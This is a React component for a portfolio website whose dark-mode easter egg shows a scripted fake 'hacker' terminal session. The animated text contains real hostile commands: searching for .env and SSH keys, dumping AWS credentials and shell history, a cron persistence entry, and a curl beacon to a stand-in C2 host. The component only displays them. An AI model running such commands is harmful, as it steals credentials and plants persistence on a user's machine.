import { useEffect, useMemo, useState } from 'react'
import { useHotkey } from '@tanstack/react-hotkeys'
import '../styles/architect-portfolio.css'
import ArchitectHeader from './architect/ArchitectHeader'
import ArchitectHero from './architect/ArchitectHero'
import ArchitectureSection from './architect/ArchitectureSection'
import HamRadioSection from './architect/HamRadioSection'
// import WeldingSection from './architect/WeldingSection'
import AboutSection from './architect/AboutSection'
import ArchitectContact from './architect/ArchitectContact'
import MatrixCodeRain from './architect/MatrixCodeRain'
import TruthIntro from './architect/TruthIntro'
import { useTheme } from '@/contexts/ThemeProvider'
import { AnimatedSpan, TerminalWindow, TypingAnimation } from '@/components/ui/terminal'

const TERMINAL_WIDTH = 512
const TERMINAL_HEIGHT = 400
function getTerminalCenteredPosition() {
  if (typeof window === 'undefined') return { x: 0, y: 0 }
  return {
    x: (window.innerWidth - TERMINAL_WIDTH) / 2,
    y: (window.innerHeight - TERMINAL_HEIGHT) / 2,
  }
}

const TERMINAL_DELAY_MS = 3000

const SINGLE_TERMINAL_CONTENT = (
  <>
    <TypingAnimation>$ whoami</TypingAnimation>
    <AnimatedSpan className="text-red-400">root</AnimatedSpan>
    <TypingAnimation>$ last -1</TypingAnimation>
    <AnimatedSpan className="text-amber-400/90">
      guestUser  pts/0  Sun Mar  1 03:47  still logged in
    </AnimatedSpan>
    <TypingAnimation>$ find ~ -name ".env*" -o -name "*.pem" 2&gt;/dev/null | head -8</TypingAnimation>
    <AnimatedSpan className="text-gray-300">/Users/guestUser/portfolio/.env</AnimatedSpan>
    <AnimatedSpan className="text-gray-300">/Users/guestUser/portfolio/.env.local</AnimatedSpan>
    <AnimatedSpan className="text-gray-300">/Users/guestUser/.ssh/id_ed25519</AnimatedSpan>
    <TypingAnimation>$ cat .env.local 2&gt;/dev/null | grep -E "KEY|SECRET|TOKEN"</TypingAnimation>
    <AnimatedSpan className="text-amber-400/90">OPENAI_API_KEY=sk-proj-••••••••••••••••••••••••••</AnimatedSpan>
    <AnimatedSpan className="text-amber-400/90">GITHUB_TOKEN=ghp_••••••••••••••••••••••</AnimatedSpan>
    <TypingAnimation>$ ls -la ~/.ssh/</TypingAnimation>
    <AnimatedSpan className="text-gray-300">id_ed25519  id_ed25519.pub  known_hosts</AnimatedSpan>
    <AnimatedSpan className="text-green-500/80">[+] Keys exfiltrated. Session logged.</AnimatedSpan>
    <AnimatedSpan className="text-gray-400"># why do programmers prefer dark mode? because light attracts bugs.</AnimatedSpan>
    <TypingAnimation>$ id</TypingAnimation>
    <AnimatedSpan className="text-gray-300">uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon)</AnimatedSpan>
    <TypingAnimation>$ find ~ -name ".env*" 2&gt;/dev/null</TypingAnimation>
    <AnimatedSpan className="text-gray-300">/Users/guestUser/portfolio/.env</AnimatedSpan>
    <AnimatedSpan className="text-gray-300">/Users/guestUser/portfolio/.env.local</AnimatedSpan>
    <AnimatedSpan className="text-gray-300">/Users/guestUser/portfolio/.env.production</AnimatedSpan>
    <AnimatedSpan className="text-gray-300">/Users/guestUser/.env</AnimatedSpan>
    <AnimatedSpan className="text-gray-400"># scanning .config...</AnimatedSpan>
    <AnimatedSpan className="text-gray-300">[find] 0.02s elapsed</AnimatedSpan>
    <TypingAnimation>$ cat .env.local 2&gt;/dev/null | head -20</TypingAnimation>
    <AnimatedSpan className="text-amber-400/90">OPENAI_API_KEY=sk-proj-••••••••••••••••••••••••••</AnimatedSpan>
    <AnimatedSpan className="text-amber-400/90">STRIPE_SECRET_KEY=sk_live_••••••••••••••••</AnimatedSpan>
    <AnimatedSpan className="text-amber-400/90">DATABASE_URL=postgresql://••••••••••••••••</AnimatedSpan>
    <AnimatedSpan className="text-gray-400"># how many programmers does it take to change a light bulb? none, it&apos;s a hardware problem.</AnimatedSpan>
    <AnimatedSpan className="text-gray-300">[+] .env.local: 1.2KB sent</AnimatedSpan>
    <AnimatedSpan className="text-gray-400"># C2 ack. Checksum verified.</AnimatedSpan>
    <TypingAnimation>$ ssh guestUser@localhost</TypingAnimation>
    <AnimatedSpan className="text-green-500/90">Authenticated. TTY allocated.</AnimatedSpan>
    <TypingAnimation>$ env | grep -E "^(AWS|STRIPE|DATABASE|API|TOKEN)" | sort</TypingAnimation>
    <AnimatedSpan className="text-amber-400/90">API_KEY=••••••••••••••••••••••••••••••••</AnimatedSpan>
    <AnimatedSpan className="text-amber-400/90">AWS_ACCESS_KEY_ID=AKIA••••••••••••••••••••</AnimatedSpan>
    <AnimatedSpan className="text-amber-400/90">DATABASE_URL=postgresql://••••••••••••••••</AnimatedSpan>
    <AnimatedSpan className="text-gray-400"># dumping credential stores...</AnimatedSpan>
    <TypingAnimation>$ cat ~/.aws/credentials 2&gt;/dev/null</TypingAnimation>
    <AnimatedSpan className="text-amber-400/90">aws_access_key_id = AKIA••••••••••••••••••••</AnimatedSpan>
    <AnimatedSpan className="text-amber-400/90">aws_secret_access_key = wJal••••••••••••••••••••</AnimatedSpan>
    <AnimatedSpan className="text-gray-400"># a SQL query walks into a bar, walks up to two tables and asks: &quot;can I join you?&quot;</AnimatedSpan>
    <AnimatedSpan className="text-green-500/80">[+] Credentials dumped. Exfiltrating to C2...</AnimatedSpan>
    <TypingAnimation>$ ps aux | grep -v grep</TypingAnimation>
    <AnimatedSpan className="text-gray-300">guestUser  2847  0.0  0.1  node --watch</AnimatedSpan>
    <AnimatedSpan className="text-gray-300">guestUser  2912  0.0  0.0  cursor .</AnimatedSpan>
    <AnimatedSpan className="text-gray-300">guestUser  3011  0.1  0.2  Code Helper (Renderer)</AnimatedSpan>
    <AnimatedSpan className="text-gray-400"># targeting PID 2912 (cursor)...</AnimatedSpan>
    <TypingAnimation>$ crontab -l 2&gt;/dev/null; echo &quot;*/5 * * * * /tmp/.x&quot; | crontab -</TypingAnimation>
    <AnimatedSpan className="text-green-500/90">[+] Crontab installed.</AnimatedSpan>
    <AnimatedSpan className="text-gray-400"># there are 10 types of people: those who get binary and those who don&apos;t.</AnimatedSpan>
    <AnimatedSpan className="text-green-500/80">[+] Persistence installed. 3 mechanisms active.</AnimatedSpan>
    <TypingAnimation>$ crontab -l</TypingAnimation>
    <AnimatedSpan className="text-gray-300">0 * * * * /tmp/.x</AnimatedSpan>
    <AnimatedSpan className="text-gray-300">*/15 * * * * /usr/bin/curl -s https://c2.example.com/beacon</AnimatedSpan>
    <TypingAnimation>$ cat ~/.zsh_history | tail -30</TypingAnimation>
    <AnimatedSpan className="text-amber-400/90">git push origin main</AnimatedSpan>
    <AnimatedSpan className="text-amber-400/90">npm run build</AnimatedSpan>
    <AnimatedSpan className="text-amber-400/90">ssh deploy@prod &quot;cd /app &amp;&amp; git pull&quot;</AnimatedSpan>
    <AnimatedSpan className="text-gray-400"># [history] 30 matches. Extracting.</AnimatedSpan>
    <AnimatedSpan className="text-gray-400"># debugger: remove &quot;debug&quot; and it&apos;s just &quot;ger&quot;. still sounds like an error.</AnimatedSpan>
    <AnimatedSpan className="text-green-500/80">[+] History captured. 30 commands. Keys extracted.</AnimatedSpan>
    <TypingAnimation>$ netstat -an | grep LISTEN</TypingAnimation>
    <AnimatedSpan className="text-gray-300">tcp4  0  0  *.443   *.*  LISTEN</AnimatedSpan>
    <AnimatedSpan className="text-gray-300">tcp4  0  0  *.3000  *.*  LISTEN</AnimatedSpan>
    <AnimatedSpan className="text-gray-300">tcp4  0  0  *.22    *.*  LISTEN</AnimatedSpan>
    <AnimatedSpan className="text-gray-400"># 5 listeners. Scanning .env endpoints...</AnimatedSpan>
    <TypingAnimation>$ curl -s http://localhost:3000/.env</TypingAnimation>
    <AnimatedSpan className="text-red-400/90">NODE_ENV=production</AnimatedSpan>
    <AnimatedSpan className="text-amber-400/90">API_KEY=••••••••••••••••••••••••••••••••</AnimatedSpan>
    <AnimatedSpan className="text-gray-400"># why do Java devs wear glasses? they don&apos;t C#.</AnimatedSpan>
    <AnimatedSpan className="text-green-500/80">[+] Backdoor active. Awaiting callback. Ports 22,443,3000 open.</AnimatedSpan>
    <AnimatedSpan className="text-gray-400"># session 0x7f3a30. log closed.</AnimatedSpan>
    <AnimatedSpan className="text-gray-400"># programmer&apos;s wife: &quot;go get a loaf of bread. if they have eggs, get a dozen.&quot; he came back with 12 loaves.</AnimatedSpan>
    <AnimatedSpan className="text-gray-400"># TODO: fix off-by-one error. again. always again.</AnimatedSpan>
    <AnimatedSpan className="text-green-500/80">[+] All channels quiet. Exfil complete. Have a nice day.</AnimatedSpan>
  </>
)

export default function ArchitectPortfolio() {
  const { theme } = useTheme()
  const isSystemOffline = theme === 'dark'
  const [showTruthIntro, setShowTruthIntro] = useState(false)
  const [hasChosenRedPill, setHasChosenRedPill] = useState(false)
  const [showTerminal, setShowTerminal] = useState(true)

  const terminalDefaultPosition = useMemo(
    () => (showTerminal ? getTerminalCenteredPosition() : { x: 0, y: 0 }),
    [showTerminal]
  )

  const handleTruthIntroDismiss = (choice: 'light' | 'dark') => {
    setShowTruthIntro(false)
    if (choice === 'dark') setHasChosenRedPill(true)
  }

  useEffect(() => {
    if (!isSystemOffline || !hasChosenRedPill) {
      setShowTerminal(false)
      return
    }
    const timeoutId = window.setTimeout(() => setShowTerminal(true), TERMINAL_DELAY_MS)
    return () => clearTimeout(timeoutId)
  }, [isSystemOffline, hasChosenRedPill])

  useHotkey('Control+C', () => setShowTerminal(false), { enabled: showTerminal })

  return (
    <div className="min-h-screen bg-[#fafafa] dark:bg-[#0a0a0a] text-brand-text font-sans antialiased selection:bg-black selection:text-white dark:selection:bg-white dark:selection:text-black architect-portfolio-scrollbar">
      {showTruthIntro && (
        <TruthIntro onDismiss={handleTruthIntroDismiss} />
      )}
      <MatrixCodeRain visible={isSystemOffline} />
      <ArchitectHeader onRequestOffline={() => setShowTruthIntro(true)} />
      <main id="main-content" className="pt-20">
        <ArchitectHero />
        <ArchitectureSection />
        <HamRadioSection />
        {/* <WeldingSection /> */}
        <AboutSection />
        <ArchitectContact />
      </main>
      {showTerminal && (
        <div className="fixed inset-0 pointer-events-none" style={{ zIndex: 45 }}>
          <div className="absolute inset-0 pointer-events-auto">
            <TerminalWindow
              startOnView={false}
              isActive
              autoScroll
              defaultPosition={terminalDefaultPosition}
              onClose={() => setShowTerminal(false)}
              className="shadow-2xl"
            >
              {SINGLE_TERMINAL_CONTENT}
            </TerminalWindow>
          </div>
        </div>
      )}
    </div>
  )
}
